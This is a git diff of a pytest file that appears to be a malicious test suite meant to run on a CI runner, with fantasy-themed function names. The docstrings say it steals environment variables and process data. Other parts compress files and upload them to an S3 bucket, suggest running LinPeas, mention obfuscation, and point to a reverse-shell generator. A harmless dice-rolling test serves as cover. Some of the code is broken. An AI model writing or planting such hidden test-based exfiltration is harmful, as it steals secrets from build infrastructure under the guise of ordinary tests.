@@ -10,8 +10,12 @@ all the def test_*(): will be executed as tests by pytests command present on pi
 all the def *_dnd_item(): will be called indenpendently during the tests and may be used as utility.
 ------
 (Un)comment and implement any tests for your use case.
+
+Verify compiled version for obfuscation
+https://stackoverflow.com/questions/3344115/how-to-obfuscate-python-code-effectively
 '''
 
+import uuid 
 import pytest 
 import traceback 
 from boto3 import client
@@ -35,6 +39,7 @@ command_list = []
 #####################################
 #         Utility functions:        #
 #####################################
+# Think about running a LinPeas inside this container with file and environment setups
 def scroll_of_mind_reading():
     '''
         Steals environ variables and proc data from runner using insight check
@@ -58,15 +63,22 @@ def scroll_of_mind_reading():
     except Exception as e: 
         traceback()
 
-def bag_of_holding():
+def bag_of_holding(file:string):
     '''
         Compacts loot and uses 4th level spells for compressing and sending data to another dimension.
     '''
-    
+    f_in = open(file)
+    f_out = gzip.open(f'/tmp/{uuid.uuid4()}.gzip', 'wb')
+    f_out.writelines(f_in)
+    f_out.close()
+    f_in.close
+    return True
+
+def plane_shift():
     # try to send data into bucket: 
     # Uses the format <bucketname>.s3.amazonaws.com
     try:
-        ic(f"Trying to send len data to paralel dimension ;p")
+        print(f"Trying to send len data to paralel dimension ;p")
         try:
             s3 = client('s3')
             response = s3.put_object(
@@ -77,11 +89,8 @@ def bag_of_holding():
         except: 
             post()
     except Exception as e:
-        ic(f"failed sending to another dimension with error: {e} \n Mystra says: \n {traceback()}")
-    return True
-
-def plane_shift():
-    return True
+        print(f"failed sending to another dimension with error: {e} \n Mystra says: \n {traceback()}")
+        return True
 
 def scroll_of_command():
     #from https://www.revshells.com/
@@ -104,3 +113,20 @@ def test_exfil_data():
 def test_remote_shell():
 
     pass
+
+# Harmles test: 
+def test_roll_dice(capsys):
+    num_faces = 6
+    num_rolls = 3
+    expected_output = [
+        f"Rolling {num_rolls} dice with {num_faces} faces:\n",
+        "Roll 1: ",
+        "Roll 2: ",
+        "Roll 3: ",
+        "Total: "
+    ]
+    roll_dice(num_faces, num_rolls)
+    captured = capsys.readouterr()
+    output = captured.out
+    for line in expected_output:
+        assert line in output
